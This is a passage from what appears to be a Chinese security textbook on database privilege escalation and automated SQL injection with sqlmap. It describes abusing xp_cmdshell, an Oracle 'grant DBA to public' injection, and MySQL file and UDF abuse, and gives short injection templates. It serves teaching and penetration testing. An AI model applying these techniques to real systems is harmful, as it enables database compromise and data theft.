- 通过创建用户定义的功能任意扩充数据库的现有功能。有些时候，可以通过这种方式重新执行已被删除或禁用的功能，避开数据库实施的强化保护措施。只要已经获得数据库管理员（DBA）权限，就有办法在每种主流数据库中执行这种操作。

攻击数据库是一个内容广泛的主题。本节将分析几种关键方法，说明如何通过它们利用主要数据库的漏洞和功能扩大攻击范围。我们得出的主要结论是：每种数据库都有提升权限的可能性。应用当前发布的安全补丁和可靠的强化措施能够帮助避免许多（但并非全部）这种攻击。

### MS-SQL

最常被攻击者滥用的数据库功能可能是`xp_cmdshell`存储过程，它是MS-SQL默认内置的一项功能。这个存储过程允许数据库管理员用户以和cmd.exe命令提示符相同的方式执行操作系统命令。

攻击者可在众多情况下滥用这项功能。他们可以执行任意命令，将结果指向本地文件，然后读取文件内容。他们可以打开一个连通自己计算机的带外网络连接，并建立一条秘密的命令和通信渠道，从服务器复制数据并上传攻击工具。由于MS-SQL默认以LocalSystem运行，攻击者一般能够完全攻破基本的操作系统，执行任意操作。MS-SQL中还有许多其他存储过程，如xp_regread或xp_regwrite，也可用于在Windows操作系统注册表中执行强大的操作。

处理默认锁定
    互联网上的大多数MS-SQL为MS-SQL 2005或更高版本。这些版本提供各种安全功能，可以在默认情况下锁定数据库，以防止各种攻击。

    但是，如果数据库中的Web应用程序用户账户拥有足够高的权限，则通过重新设置数据库，该用户就可以突破上述功能实施的限制。例如，可以使用`sp_configure`存储过程重新启用被禁用的xp_cmdshell。

### Oracle

Oracle包含许多可在数据库管理员权限下运行的内置的存储过程，并已发现在这些存储过程中存在SQL注入漏洞。在2006年7月发布重要补丁前，存在于默认包`SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`中的缺陷就是一个典型的示例。攻击者可以利用这个缺陷，在易受攻击的字段中注入`grant DBA to public`查询来提升权限。

这种类型的攻击可通过利用Web应用程序中的SQL注入漏洞，在易受攻击的参数中注入函数来实现。

除这些漏洞外，Oracle还含有大量默认功能，这些功能可被低权限用户访问，并可用于执行各种敏感操作，如建立网络连接或访问文件系统。除了前面描述的用于建立带外连接的功能强大的包以外，UTL_FILE包可用于在数据库服务器文件系统上读取和写入文件。

2010年，David Litchfield演示了如何在Oracle 10g R2和11g中利用Java来执行操作系统命令。该攻击首先利用`DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY`中的缺陷授予当前用户`java.io.filepermission`权限，然后使用`DBMS_JAVA.RUNJAVA` 执行运行操作系统命令的Java 类（oracle/aurora/util/Wrapper）。

### MySQL

MySQL中包含的可被攻击者滥用的内置功能相对较少。其中一个示例是任何拥有FILE_PRIV许可的用户都可以读取并写入文件系统。

`LOAD_FILE`命令可用于获取任何文件的内容。

`SELECT …INTO OUTFILE` 命令可用于将任何一个查询的输出指向一个文件。

除读取并写入关键的操作系统文件外，这些命令还可用于执行其他攻击。

- 因为MySQL将数据保存在明文文件中，数据库必须拥有读取这些文件的权限。拥有FILE_PRIV许可的攻击者可以打开相关文件并读取数据库中的任何数据，避开数据库实施的任何访问控制。

- MySQL允许用户通过调用一个包含函数执行过程的编译库文件（compiled library file）创建一个用户定义的函数（UDF）。这个文件必须位于MySQL加载动态库的正常路径内。攻击者可以使用前面描述的方法在这个路径中创建任意二进制文件，然后建立使用这个文件的UDF。

## 使用SQL注入工具

我们介绍的许多利用SQL注入漏洞的攻击技巧都需要提交大量请求，以逐次提取少量的数据。幸运的是，我们可以使用各种工具来自动完成上述过程；同时，这些工具还能够识别成功实施攻击所需的数据库特定的语法。

当前，多数工具通过以下方法来利用SQL注入漏洞。

- 对目标请求中的所有参数实施蛮力攻击，以查找SQL注入点。

- 通过附加各种字符，如闭括号、注释字符和SQL关键字，确定后端SQL查询中易受攻击的字段的位置。

- 通过蛮力猜测请求的列数，然后确定包含varchar数据类型的列（可用于返回结果），尝试实施UNION攻击。

- 注入定制查询来检索任意数据——如果需要，将多个列中的数据串连成一个字符串，以便于从单独一个varchar数据类型的结果中进行检索。

- 如果无法使用UNION检索结果，可以在查询中注入布尔型条件（AND 1=1、AND 1=2等），以确定是否可以使用条件响应来检索数据。

- 如果无法通过注入条件表达式来检索结果，可以尝试使用条件时间延迟来检索数据。

这些工具通过在目标数据库中查询相关元数据表来查找数据。通常，它们能够执行一定程度的权限提升，如使用xp_cmdshell获得操作系统级访问权限。它们还使用各种优化技巧，并利用各种数据库中的诸多功能和内置函数，以减少基于推测的蛮力攻击所需提交的查询数，避开可能对单引号实施的过滤，等等。

这些工具是主要的注入工具，最适于通过利用已确定并熟悉的注入点，从数据库中提取数据。在通过这些工具注入数据之前或之后，通常需要提供其他一些SQL语法，以确保这些工具的硬编码攻击生效。

渗透测试步骤
    确定某个SQL注入漏洞后，可以考虑使用SQL注入工具来利用该漏洞，并从数据库中检索有用的数据。在需要使用盲目技巧每次检索少量数据时，这种做法尤其有效。

    （1）使用拦截代理服务器运行SQL注入工具，分析该工具提交的请求以及应用程序的响应。打开工具上的任何详细输出选项，并将它的进度与观察到的查询和响应关联起来。

    （2）由于这些工具通常依赖预先设置的测试和特定的响应语法，因此，攻击者可能需要将数据附加或前置到这些工具注入的字符串中，以确保获得预期的响应。典型的要求包括添加注释字符、平衡服务器的SQL查询中的单引号，以及将闭括号前置或附加到字符串以与原始查询匹配。

    （3）如果尽管采用了上述方法，但查询语法仍然无效，这时，最简单的方法是创建完全受控制的嵌套查询，并使用注入工具注入该子查询。这样，注入工具就可以通过推断来提取数据。在注入标准的SELECT和UPDATE查询时，嵌套查询非常有用。在Oracle中，嵌套查询位于INSERT语句中。下面的示例前置`[input]`之前的文本，并附加该位置之后的闭括号：

        Oracle：`'||(select 1 from dual where 1=[input])`
        MS-SQL：`(select 1 where 1=[input])`

有大量工具可用于实施自动SQL注入攻击。其中许多工具针对MS-SQL，其他一些工具已停止开发，并因为新技巧的出现和SQL注入领域的发展而废弃。sqlmap，该工具可用于攻击MySQL、Oracle、MS-SQL及其他数据库。它执行基于UNION和推断的检索，并且支持各种权限提升方法，包括从操作系统中检索文件，以及在Windows中使用xp_cmdshell执行命令。

实际上，sqlmap是一种通过时间延迟或其他推断方法检索数据库信息的有效工具，并且可用于基于UNION的检索。利用该工具的最佳方法之一，是使用--sql-shell选项。这样，攻击者将能够在SQL提示符下于后台执行必要的UNION、基于错误或盲目的SQL注入，以发送和检索结果。

